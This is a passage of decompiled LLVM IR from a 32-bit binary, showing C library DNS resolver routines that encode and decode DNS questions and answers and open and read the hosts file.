  %v1_804da0d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804da0d = add i32 %v1_804da0d, 36
  %v3_804da0d = inttoptr i32 %v2_804da0d to i32*
  store i32 %v2_804da0b, i32* %v3_804da0d, align 4
  %v0_804da10 = load i32, i32* @ecx, align 4
  %v1_804da10 = add i32 %v0_804da10, 8
  %v2_804da10 = inttoptr i32 %v1_804da10 to i8*
  %v3_804da10 = load i8, i8* %v2_804da10, align 1
  %v4_804da10 = zext i8 %v3_804da10 to i32
  %v1_804da14 = add i32 %v0_804da10, 9
  %v2_804da14 = inttoptr i32 %v1_804da14 to i8*
  %v3_804da14 = load i8, i8* %v2_804da14, align 1
  %v4_804da14 = zext i8 %v3_804da14 to i32
  %v2_804da18 = mul nuw nsw i32 %v4_804da10, 256
  %v2_804da1b = or i32 %v4_804da14, %v2_804da18
  %v1_804da1d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804da1d = add i32 %v1_804da1d, 40
  %v3_804da1d = inttoptr i32 %v2_804da1d to i32*
  store i32 %v2_804da1b, i32* %v3_804da1d, align 4
  %v0_804da20 = load i32, i32* @ecx, align 4
  %v1_804da20 = add i32 %v0_804da20, 10
  %v2_804da20 = inttoptr i32 %v1_804da20 to i8*
  %v3_804da20 = load i8, i8* %v2_804da20, align 1
  %v4_804da20 = zext i8 %v3_804da20 to i32
  %v1_804da24 = add i32 %v0_804da20, 11
  %v2_804da24 = inttoptr i32 %v1_804da24 to i8*
  %v3_804da24 = load i8, i8* %v2_804da24, align 1
  %v4_804da24 = zext i8 %v3_804da24 to i32
  %v2_804da28 = mul nuw nsw i32 %v4_804da20, 256
  %v2_804da2b = or i32 %v4_804da24, %v2_804da28
  %v1_804da2d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804da2d = add i32 %v1_804da2d, 44
  %v3_804da2d = inttoptr i32 %v2_804da2d to i32*
  store i32 %v2_804da2b, i32* %v3_804da2d, align 4
  %v2_804da35 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804da35, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_804da38 = load i32, i32* @edi, align 4
  %v0_804da39 = load i32, i32* @esi, align 4
  %v0_804da3a = load i32, i32* @ebx, align 4
  store i32 %v0_804da3a, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_804da47 = load i32, i32* @eax, align 4
  %v1_804da4a = inttoptr i32 %tmp to i32*
  %v2_804da4a = load i32, i32* %v1_804da4a, align 4
  %v7_804da4c = inttoptr i32 %v2_804da4a to i8*
  %v8_804da4c = call i32 @__encode_dotted(i8* %v7_804da4c, i32 %tmp2, i32 %tmp3, i32 %v0_804da47, i32 %v0_804da3a, i32 %v0_804da39, i32 %v0_804da38)
  %v2_804da54 = icmp slt i32 %v8_804da4c, 0
  store i32 %v8_804da4c, i32* @ecx, align 4
  br i1 %v2_804da54, label %dec_label_pc_804da85, label %dec_label_pc_804da5a

dec_label_pc_804da5a:                             ; preds = %entry
  %v0_804da5a = load i32, i32* @ebx, align 4
  %v2_804da5a = sub i32 %v0_804da5a, %v8_804da4c
  %v1_804da5c = add i32 %v2_804da5a, -3
  %v6_804da5c = sub i32 2, %v2_804da5a
  %v7_804da5c = and i32 %v6_804da5c, %v2_804da5a
  %v8_804da5c = icmp slt i32 %v7_804da5c, 0
  %v9_804da5c = icmp eq i32 %v1_804da5c, 0
  %v10_804da5c = icmp slt i32 %v1_804da5c, 0
  %v3_804da5f = icmp eq i1 %v10_804da5c, %v8_804da5c
  %v4_804da5f = icmp eq i1 %v9_804da5c, false
  %v5_804da5f = and i1 %v4_804da5f, %v3_804da5f
  br i1 %v5_804da5f, label %dec_label_pc_804da66, label %dec_label_pc_804da61

dec_label_pc_804da61:                             ; preds = %dec_label_pc_804da5a
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_804da85

dec_label_pc_804da66:                             ; preds = %dec_label_pc_804da5a
  %v0_804da66 = load i32, i32* @edi, align 4
  %v2_804da66 = add i32 %v0_804da66, %v8_804da4c
  store i32 %v2_804da66, i32* @edx, align 4
  %v0_804da69 = load i32, i32* @esi, align 4
  %v1_804da69 = add i32 %v0_804da69, 5
  %v2_804da69 = inttoptr i32 %v1_804da69 to i8*
  %v3_804da69 = load i8, i8* %v2_804da69, align 1
  %v1_804da6d = add i32 %v8_804da4c, 4
  store i32 %v1_804da6d, i32* @ecx, align 4
  %v3_804da70 = inttoptr i32 %v2_804da66 to i8*
  store i8 %v3_804da69, i8* %v3_804da70, align 1
  %v0_804da72 = load i32, i32* @esi, align 4
  %v1_804da72 = add i32 %v0_804da72, 4
  %v2_804da72 = inttoptr i32 %v1_804da72 to i32*
  %v3_804da72 = load i32, i32* %v2_804da72, align 4
  %v1_804da75 = trunc i32 %v3_804da72 to i8
  %v2_804da75 = load i32, i32* @edx, align 4
  %v3_804da75 = add i32 %v2_804da75, 1
  %v4_804da75 = inttoptr i32 %v3_804da75 to i8*
  store i8 %v1_804da75, i8* %v4_804da75, align 1
  %v0_804da78 = load i32, i32* @esi, align 4
  %v1_804da78 = add i32 %v0_804da78, 9
  %v2_804da78 = inttoptr i32 %v1_804da78 to i8*
  %v3_804da78 = load i8, i8* %v2_804da78, align 1
  %v2_804da7c = load i32, i32* @edx, align 4
  %v3_804da7c = add i32 %v2_804da7c, 2
  %v4_804da7c = inttoptr i32 %v3_804da7c to i8*
  store i8 %v3_804da78, i8* %v4_804da7c, align 1
  %v0_804da7f = load i32, i32* @esi, align 4
  %v1_804da7f = add i32 %v0_804da7f, 8
  %v2_804da7f = inttoptr i32 %v1_804da7f to i32*
  %v3_804da7f = load i32, i32* %v2_804da7f, align 4
  %v1_804da82 = trunc i32 %v3_804da7f to i8
  %v2_804da82 = load i32, i32* @edx, align 4
  %v3_804da82 = add i32 %v2_804da82, 3
  %v4_804da82 = inttoptr i32 %v3_804da82 to i8*
  store i8 %v1_804da82, i8* %v4_804da82, align 1
  %v0_804da86.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804da85

dec_label_pc_804da85:                             ; preds = %entry, %dec_label_pc_804da61, %dec_label_pc_804da66
  %v0_804da86 = phi i32 [ %v8_804da4c, %entry ], [ -1, %dec_label_pc_804da61 ], [ %v0_804da86.pre, %dec_label_pc_804da66 ]
  %v2_804da85 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804da85, i32* @ebx, align 4
  store i32 %v0_804da38, i32* @edi, align 4
  ret i32 %v0_804da86

; uselistorder directives
  uselistorder i32 %v1_804da5c, { 1, 0 }
  uselistorder i32 %v2_804da5a, { 0, 2, 1 }
  uselistorder i32 %v8_804da4c, { 1, 2, 0, 3, 5, 4 }
  uselistorder label %dec_label_pc_804da85, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_804da97 = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_804da9c = icmp slt i32 %v2_804da97, 0
  %v1_804da9e = add i32 %v2_804da97, 4
  %v1_804daa1 = icmp eq i1 %v2_804da9c, false
  %v4_804daa1 = select i1 %v1_804daa1, i32 %v1_804da9e, i32 %v2_804da97
  ret i32 %v4_804daa1

; uselistorder directives
  uselistorder i32 %v2_804da97, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804daa8 = load i32, i32* @ebp, align 4
  %v0_804daa9 = load i32, i32* @edi, align 4
  %v0_804daaa = load i32, i32* @esi, align 4
  %v0_804daab = load i32, i32* @ebx, align 4
  store i32 %v0_804daab, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_804dacc = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804dacc, i32* %eax.global-to-local, align 4
  %v4_804dad9 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_804dacc, i32 256)
  store i32 %v4_804dad9, i32* %eax.global-to-local, align 4
  %v3_804dae1 = icmp slt i32 %v4_804dad9, 0
  store i32 %v4_804dad9, i32* @edi, align 4
  br i1 %v3_804dae1, label %dec_label_pc_804db94, label %dec_label_pc_804daeb

dec_label_pc_804daeb:                             ; preds = %entry
  %v0_804daeb = load i32, i32* @ebx, align 4
  %v3_804daeb = add i32 %v0_804daeb, %v4_804dad9
  %v0_804daed = load i32, i32* @esi, align 4
  %v2_804daed = sub i32 %v0_804daed, %v3_804daeb
  %v1_804daef = add i32 %v2_804daed, -10
  %v10_804daef = icmp slt i32 %v1_804daef, 0
  store i32 %v1_804daef, i32* @esi, align 4
  %v1_804dafa = icmp eq i1 %v10_804daef, false
  br i1 %v1_804dafa, label %dec_label_pc_804db03, label %dec_label_pc_804dafc

dec_label_pc_804dafc:                             ; preds = %dec_label_pc_804daeb
  br label %dec_label_pc_804db94

dec_label_pc_804db03:                             ; preds = %dec_label_pc_804daeb
  %v6_804db0a = add i32 %v3_804daeb, %tmp4
  store i32 %v6_804db0a, i32* @ebx, align 4
  store i32 %v2_804dacc, i32* %eax.global-to-local, align 4
  %v1_804db16 = bitcast i32* %stack_var_-272 to i8*
  %v2_804db16 = call i32 @__GI_strdup(i8* %v1_804db16)
  store i32 %v2_804db16, i32* %eax.global-to-local, align 4
  %v0_804db1b = load i32, i32* @ebx, align 4
  %v1_804db1b = add i32 %v0_804db1b, 4
  store i32 %v1_804db1b, i32* %esi.global-to-local, align 4
  %v1_804db1e = load i32, i32* @ebp, align 4
  %v2_804db1e = inttoptr i32 %v1_804db1e to i32*
  store i32 %v2_804db16, i32* %v2_804db1e, align 4
  %v0_804db21 = load i32, i32* @ebx, align 4
  %v1_804db21 = inttoptr i32 %v0_804db21 to i8*
  %v2_804db21 = load i8, i8* %v1_804db21, align 1
  %v3_804db21 = zext i8 %v2_804db21 to i32
  store i32 %v3_804db21, i32* %eax.global-to-local, align 4
  %v1_804db24 = add i32 %v0_804db21, 1
  %v2_804db24 = inttoptr i32 %v1_804db24 to i8*
  %v3_804db24 = load i8, i8* %v2_804db24, align 1
  %v4_804db24 = zext i8 %v3_804db24 to i32
  store i32 %v4_804db24, i32* %edx.global-to-local, align 4
  %v2_804db28 = mul nuw nsw i32 %v3_804db21, 256
  %v2_804db2b = or i32 %v4_804db24, %v2_804db28
  store i32 %v2_804db2b, i32* %eax.global-to-local, align 4
  %v1_804db2d = load i32, i32* @ebp, align 4
  %v2_804db2d = add i32 %v1_804db2d, 4
  %v3_804db2d = inttoptr i32 %v2_804db2d to i32*
  store i32 %v2_804db2b, i32* %v3_804db2d, align 4
  %v0_804db30 = load i32, i32* @ebx, align 4
  %v1_804db30 = add i32 %v0_804db30, 2
  %v2_804db30 = inttoptr i32 %v1_804db30 to i8*
  %v3_804db30 = load i8, i8* %v2_804db30, align 1
  %v4_804db30 = zext i8 %v3_804db30 to i32
  store i32 %v4_804db30, i32* %eax.global-to-local, align 4
  %v1_804db34 = add i32 %v0_804db30, 3
  %v2_804db34 = inttoptr i32 %v1_804db34 to i8*
  %v3_804db34 = load i8, i8* %v2_804db34, align 1
  %v4_804db34 = zext i8 %v3_804db34 to i32
  store i32 %v4_804db34, i32* %edx.global-to-local, align 4
  %v2_804db38 = mul nuw nsw i32 %v4_804db30, 256
  %v2_804db3b = or i32 %v4_804db34, %v2_804db38
  store i32 %v2_804db3b, i32* %eax.global-to-local, align 4
  %v1_804db3d = load i32, i32* @ebp, align 4
  %v2_804db3d = add i32 %v1_804db3d, 8
  %v3_804db3d = inttoptr i32 %v2_804db3d to i32*
  store i32 %v2_804db3b, i32* %v3_804db3d, align 4
  %v0_804db40 = load i32, i32* @ebx, align 4
  %v1_804db40 = add i32 %v0_804db40, 4
  %v2_804db40 = inttoptr i32 %v1_804db40 to i8*
  %v3_804db40 = load i8, i8* %v2_804db40, align 1
  %v4_804db40 = zext i8 %v3_804db40 to i32
  store i32 %v4_804db40, i32* %edx.global-to-local, align 4
  %v0_804db44 = load i32, i32* %esi.global-to-local, align 4
  %v1_804db44 = add i32 %v0_804db44, 1
  %v2_804db44 = inttoptr i32 %v1_804db44 to i8*
  %v3_804db44 = load i8, i8* %v2_804db44, align 1
  %v4_804db44 = zext i8 %v3_804db44 to i32
  store i32 %v4_804db44, i32* %eax.global-to-local, align 4
  %v1_804db48 = add i32 %v0_804db44, 2
  %v2_804db48 = inttoptr i32 %v1_804db48 to i8*
  %v3_804db48 = load i8, i8* %v2_804db48, align 1
  %v4_804db48 = zext i8 %v3_804db48 to i32
  %v2_804db4c = mul nuw i32 %v4_804db40, 16777216
  %v2_804db4f = mul nuw nsw i32 %v4_804db44, 65536
  store i32 %v2_804db4f, i32* %eax.global-to-local, align 4
  %v2_804db52 = or i32 %v2_804db4f, %v2_804db4c
  store i32 %v2_804db52, i32* %edx.global-to-local, align 4
  %v1_804db54 = add i32 %v0_804db44, 3
  %v2_804db54 = inttoptr i32 %v1_804db54 to i8*
  %v3_804db54 = load i8, i8* %v2_804db54, align 1
  %v4_804db54 = zext i8 %v3_804db54 to i32
  store i32 %v4_804db54, i32* %eax.global-to-local, align 4
  %v2_804db58 = mul nuw nsw i32 %v4_804db48, 256
  %v2_804db5b = or i32 %v4_804db54, %v2_804db52
  store i32 %v2_804db5b, i32* %edx.global-to-local, align 4
  %v2_804db5d = or i32 %v2_804db5b, %v2_804db58
  store i32 %v2_804db5d, i32* @ecx, align 4
  %v1_804db5f = load i32, i32* @ebp, align 4
  %v2_804db5f = add i32 %v1_804db5f, 12
  %v3_804db5f = inttoptr i32 %v2_804db5f to i32*
  store i32 %v2_804db5d, i32* %v3_804db5f, align 4
  %v0_804db62 = load i32, i32* @ebx, align 4
  %v1_804db62 = add i32 %v0_804db62, 8
  %v2_804db62 = inttoptr i32 %v1_804db62 to i8*
  %v3_804db62 = load i8, i8* %v2_804db62, align 1
  %v4_804db62 = zext i8 %v3_804db62 to i32
  store i32 %v4_804db62, i32* %edx.global-to-local, align 4
  %v1_804db66 = add i32 %v0_804db62, 9
  %v2_804db66 = inttoptr i32 %v1_804db66 to i8*
  %v3_804db66 = load i8, i8* %v2_804db66, align 1
  %v4_804db66 = zext i8 %v3_804db66 to i32
  store i32 %v4_804db66, i32* %eax.global-to-local, align 4
  %v1_804db6a = add i32 %v0_804db62, 10
  %v1_804db6d = load i32, i32* @ebp, align 4
  %v2_804db6d = add i32 %v1_804db6d, 20
  %v3_804db6d = inttoptr i32 %v2_804db6d to i32*
  store i32 %v1_804db6a, i32* %v3_804db6d, align 4
  %v0_804db70 = load i32, i32* %edx.global-to-local, align 4
  %v2_804db70 = mul i32 %v0_804db70, 256
  %v1_804db73 = load i32, i32* %eax.global-to-local, align 4
  %v2_804db73 = or i32 %v1_804db73, %v2_804db70
  store i32 %v2_804db73, i32* @edx, align 4
  %v1_804db75 = load i32, i32* @ebp, align 4
  %v2_804db75 = add i32 %v1_804db75, 16
  %v3_804db75 = inttoptr i32 %v2_804db75 to i32*
  store i32 %v2_804db73, i32* %v3_804db75, align 4
  %v1_804db7f = add i32 %v3_804daeb, 10
  store i32 %v1_804db7f, i32* %eax.global-to-local, align 4
  %v1_804db82 = load i32, i32* @ebp, align 4
  %v2_804db82 = add i32 %v1_804db82, 24
  %v3_804db82 = inttoptr i32 %v2_804db82 to i32*
  store i32 %v1_804db7f, i32* %v3_804db82, align 4
  %v4_804db85 = load i32, i32* @edx, align 4
  %v5_804db89 = icmp slt i32 %v1_804daef, %v4_804db85
  br i1 %v5_804db89, label %dec_label_pc_804db8b, label %dec_label_pc_804db90

dec_label_pc_804db8b:                             ; preds = %dec_label_pc_804db03
  br label %dec_label_pc_804db94

dec_label_pc_804db90:                             ; preds = %dec_label_pc_804db03
  %v1_804db90 = load i32, i32* @edi, align 4
  %v2_804db90 = add i32 %v4_804db85, 10
  %v3_804db90 = add i32 %v2_804db90, %v1_804db90
  br label %dec_label_pc_804db94

dec_label_pc_804db94:                             ; preds = %entry, %dec_label_pc_804db8b, %dec_label_pc_804dafc, %dec_label_pc_804db90
  %v0_804db9a = phi i32 [ %v4_804dad9, %entry ], [ -1, %dec_label_pc_804db8b ], [ %v1_804daef, %dec_label_pc_804dafc ], [ %v3_804db90, %dec_label_pc_804db90 ]
  store i32 %v0_804db9a, i32* %eax.global-to-local, align 4
  %v2_804db9c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804db9c, i32* @ebx, align 4
  store i32 %v0_804daaa, i32* @esi, align 4
  store i32 %v0_804daa9, i32* @edi, align 4
  store i32 %v0_804daa8, i32* @ebp, align 4
  ret i32 %v0_804db9a

; uselistorder directives
  uselistorder i32 %v0_804db9a, { 1, 0 }
  uselistorder i32 %v2_804db4f, { 1, 0 }
  uselistorder i32 %v1_804daef, { 0, 1, 3, 2 }
  uselistorder i32 %v3_804daeb, { 1, 0, 2 }
  uselistorder i32 %v4_804dad9, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_804dacc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804db94, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_804dbb1 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805086d.110 to i32), i32 ptrtoint (i32* @global_var_805081e.89 to i32))
  store i32 %v3_804dbb1, i32* @eax, align 4
  %v1_804dbb9 = icmp eq i32 %v3_804dbb1, 0
  %v1_804dbbb = icmp eq i1 %v1_804dbb9, false
  br i1 %v1_804dbbb, label %dec_label_pc_804dbd1, label %dec_label_pc_804dbbd

dec_label_pc_804dbbd:                             ; preds = %entry
  %v3_804dbc9 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_8050878.111 to i32), i32 ptrtoint (i32* @global_var_805081e.89 to i32))
  br label %dec_label_pc_804dbd1

dec_label_pc_804dbd1:                             ; preds = %entry, %dec_label_pc_804dbbd
  %v0_804dbd4 = phi i32 [ %v3_804dbb1, %entry ], [ %v3_804dbc9, %dec_label_pc_804dbbd ]
  ret i32 %v0_804dbd4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805081e.89 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_804dbd1, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_804dbd5 = load i32, i32* @ebp, align 4
  %v0_804dbd6 = load i32, i32* @edi, align 4
  %v0_804dbd7 = load i32, i32* @esi, align 4
  %v0_804dbd8 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_804dbe6 = sub i32 0, %arg6
  %v1_804dbe8 = urem i32 %v1_804dbe6, 4
  %v2_804dbe8 = icmp eq i32 %v1_804dbe8, 0
  store i32 %v1_804dbe8, i32* %eax.global-to-local, align 4
  br i1 %v2_804dbe8, label %dec_label_pc_804dbf9, label %dec_label_pc_804dbed

dec_label_pc_804dbed:                             ; preds = %entry
  %v2_804dbed = sub i32 %arg7, %v1_804dbe8
  %v7_804dbed = icmp ugt i32 %v1_804dbe8, %arg7
  br i1 %v7_804dbed, label %dec_label_pc_804de9d, label %dec_label_pc_804dbf5

dec_label_pc_804dbf5:                             ; preds = %dec_label_pc_804dbed
  %v2_804dbf5 = add i32 %v1_804dbe8, %arg6
  store i32 %v2_804dbf5, i32* @ebx, align 4
  store i32 %v2_804dbed, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804dbf9

dec_label_pc_804dbf9:                             ; preds = %entry, %dec_label_pc_804dbf5
  %v0_804dc07 = phi i32 [ %arg6, %entry ], [ %v2_804dbf5, %dec_label_pc_804dbf5 ]
  %v0_804dc0e = phi i32 [ %arg7, %entry ], [ %v2_804dbed, %dec_label_pc_804dbf5 ]
  %tmp = icmp ult i32 %v0_804dc0e, 32
  br i1 %tmp, label %dec_label_pc_804de9d, label %dec_label_pc_804dc02

dec_label_pc_804dc02:                             ; preds = %dec_label_pc_804dbf9
  %v12_804dc02 = icmp eq i32 %arg4, 1
  %v1_804dc07 = add i32 %v0_804dc07, 32
  store i32 %v1_804dc07, i32* %eax.global-to-local, align 4
  %v1_804dc0e = add i32 %v0_804dc0e, -32
  store i32 %v1_804dc0e, i32* @ebp, align 4
  br i1 %v12_804dc02, label %dec_label_pc_804dc02.dec_label_pc_804dd4d_crit_edge, label %dec_label_pc_804dc17

dec_label_pc_804dc02.dec_label_pc_804dd4d_crit_edge: ; preds = %dec_label_pc_804dc02
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_804dd4d

dec_label_pc_804dc17:                             ; preds = %dec_label_pc_804dc02
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_804dc1e = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_804dc1e, align 4
  %tmp140 = icmp ult i32 %v1_804dc0e, 4
  br i1 %tmp140, label %dec_label_pc_804de9d, label %dec_label_pc_804dc2a

dec_label_pc_804dc2a:                             ; preds = %dec_label_pc_804dc17
  %v0_804dc2a = load i32, i32* %edx.global-to-local, align 4
  %v1_804dc2a = add i32 %v0_804dc2a, -36
  store i32 %v1_804dc2a, i32* %eax.global-to-local, align 4
  %tmp141 = icmp ult i32 %v1_804dc2a, 8
  br i1 %tmp141, label %dec_label_pc_804de9d, label %dec_label_pc_804dc36

dec_label_pc_804dc36:                             ; preds = %dec_label_pc_804dc2a
  %v0_804dc36 = load i32, i32* @ebp, align 4
  %tmp142 = icmp ult i32 %v0_804dc36, 16
  br i1 %tmp142, label %dec_label_pc_804de9d, label %dec_label_pc_804dc3f

dec_label_pc_804dc3f:                             ; preds = %dec_label_pc_804dc36
  %v1_804dc3f = add i32 %v0_804dc2a, -48
  store i32 %v1_804dc3f, i32* %eax.global-to-local, align 4
  %tmp143 = icmp ult i32 %v1_804dc3f, 8
  br i1 %tmp143, label %dec_label_pc_804de9d, label %dec_label_pc_804dc4b

dec_label_pc_804dc4b:                             ; preds = %dec_label_pc_804dc3f
  %v0_804dc4b = load i32, i32* @ebx, align 4
  %v1_804dc4b = add i32 %v0_804dc4b, 48
  %v1_804dc4e = add i32 %v0_804dc2a, -44
  store i32 %v1_804dc4e, i32* @ebp, align 4
  %v1_804dc55 = add i32 %v0_804dc2a, -56
  store i32 %v1_804dc55, i32* @eax, align 4
  %v7_804dc58 = icmp ult i32 %v1_804dc55, %v1_804dc4e
  %v1_804dc5a = add i32 %v0_804dc4b, 36
  store i32 %v1_804dc5a, i32* @edi, align 4
  br i1 %v7_804dc58, label %dec_label_pc_804dc64, label %dec_label_pc_804dc5f

dec_label_pc_804dc5f:                             ; preds = %dec_label_pc_804dc4b
  %v1_804dc5f = add i32 %v0_804dc4b, 44
  store i32 %v1_804dc5f, i32* @esi, align 4
  br label %dec_label_pc_804dc69

dec_label_pc_804dc64:                             ; preds = %dec_label_pc_804dc4b
  %v1_804dc64 = add i32 %v0_804dc4b, 56
  store i32 %v1_804dc64, i32* @esi, align 4
  store i32 %v1_804dc55, i32* @ebp, align 4
  br label %dec_label_pc_804dc69

dec_label_pc_804dc69:                             ; preds = %dec_label_pc_804dc5f, %dec_label_pc_804dc64
  %v0_804dc69 = phi i32 [ %v1_804dc4e, %dec_label_pc_804dc5f ], [ %v1_804dc55, %dec_label_pc_804dc64 ]
  %tmp144 = icmp ult i32 %v0_804dc69, 80
  br i1 %tmp144, label %dec_label_pc_804de9d, label %dec_label_pc_804dc72

dec_label_pc_804dc72:                             ; preds = %dec_label_pc_804dc69
  %v0_804dc72 = call i32 @__open_etc_hosts()
  store i32 %v0_804dc72, i32* %eax.global-to-local, align 4
  %v1_804dc77 = icmp eq i32 %v0_804dc72, 0
  br i1 %v1_804dc77, label %dec_label_pc_804dc9f, label %dec_label_pc_804dc7f

dec_label_pc_804dc7f:                             ; preds = %dec_label_pc_804dc72
  store i32 %v1_804dc07, i32* %edx.global-to-local, align 4
  store i32 %v1_804dc4b, i32* %eax.global-to-local, align 4
  %v0_804dc87 = load i32, i32* @edi, align 4
  %v0_804dc8b = load i32, i32* @esi, align 4
  %v4_804dc8f = inttoptr i32 %v1_804dc07 to i8*
  br label %dec_label_pc_804dd4d

dec_label_pc_804dc9f:                             ; preds = %dec_label_pc_804dc72
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_804dca3 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_804dca3, align 4
  %v1_804dca9 = call i32 @__errno_location(i32 0)
  store i32 %v1_804dca9, i32* %eax.global-to-local, align 4
  %v1_804dcae = inttoptr i32 %v1_804dca9 to i32*
  %v2_804dcae = load i32, i32* %v1_804dcae, align 4
  store i32 %v2_804dcae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804de9d

dec_label_pc_804dcb9:                             ; preds = %dec_label_pc_804de20
  %v2_804dcb9 = load i8*, i8** %stack_var_-44, align 4
  %v3_804dcb9 = ptrtoint i8* %v2_804dcb9 to i32
  store i32 %v3_804dcb9, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_804dcc0 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_804dcb9, i32* %v2_804dcc0, align 4
  %v0_804dcc2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dcc2 = add i32 %v0_804dcc2, 4
  %v2_804dcc2 = inttoptr i32 %v1_804dcc2 to i32*
  store i32 0, i32* %v2_804dcc2, align 4
  %v0_804dcc9 = load i32, i32* @ebx, align 4
  %v1_804dcc9 = add i32 %v0_804dcc9, 4
  %v2_804dcc9 = inttoptr i32 %v1_804dcc9 to i32*
  %v3_804dcc9 = load i32, i32* %v2_804dcc9, align 4
  store i32 %v3_804dcc9, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_804dcc9, i32* %arg5, align 4
  %v1_804dcd2 = add i32 %tmp60, 8
  %v2_804dcd2 = inttoptr i32 %v1_804dcd2 to i32*
  store i32 2, i32* %v2_804dcd2, align 4
  %v0_804dcd9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dcd9 = add i32 %v0_804dcd9, 12
  %v2_804dcd9 = inttoptr i32 %v1_804dcd9 to i32*
  store i32 4, i32* %v2_804dcd9, align 4
  br label %dec_label_pc_804dd12

dec_label_pc_804dce6:                             ; preds = %dec_label_pc_804de42
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_804dcee = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_804dcee, align 4
  %v0_804dcf0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dcf0 = add i32 %v0_804dcf0, 4
  %v2_804dcf0 = inttoptr i32 %v1_804dcf0 to i32*
  store i32 0, i32* %v2_804dcf0, align 4
  %v0_804dcf7 = load i32, i32* @ebx, align 4
  %v1_804dcf7 = add i32 %v0_804dcf7, 4
  %v2_804dcf7 = inttoptr i32 %v1_804dcf7 to i32*
  %v3_804dcf7 = load i32, i32* %v2_804dcf7, align 4
  store i32 %v3_804dcf7, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_804dcf7, i32* %arg5, align 4
  %v1_804dd00 = add i32 %tmp60, 8
  %v2_804dd00 = inttoptr i32 %v1_804dd00 to i32*
  store i32 10, i32* %v2_804dd00, align 4
  %v0_804dd07 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dd07 = add i32 %v0_804dd07, 12
  %v2_804dd07 = inttoptr i32 %v1_804dd07 to i32*
  store i32 16, i32* %v2_804dd07, align 4
  br label %dec_label_pc_804dd12

dec_label_pc_804dd12:                             ; preds = %dec_label_pc_804dcb9, %dec_label_pc_804dce6
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_804dcb9 ], [ %storemerge3, %dec_label_pc_804dce6 ]
  %v1_804dd12 = load i32, i32* %edx.global-to-local, align 4
  %v2_804dd12 = add i32 %v1_804dd12, 16
  %v3_804dd12 = inttoptr i32 %v2_804dd12 to i32*
  store i32 %storemerge, i32* %v3_804dd12, align 4
  %v0_804dd15 = load i32, i32* @ebx, align 4
  %v1_804dd15 = add i32 %v0_804dd15, 8
  %v1_804dd18 = load i32, i32* %edx.global-to-local, align 4
  %v2_804dd18 = add i32 %v1_804dd18, 4
  %v3_804dd18 = inttoptr i32 %v2_804dd18 to i32*
  store i32 %v1_804dd15, i32* %v3_804dd18, align 4
  store i32 %arg8, i32* @eax, align 4
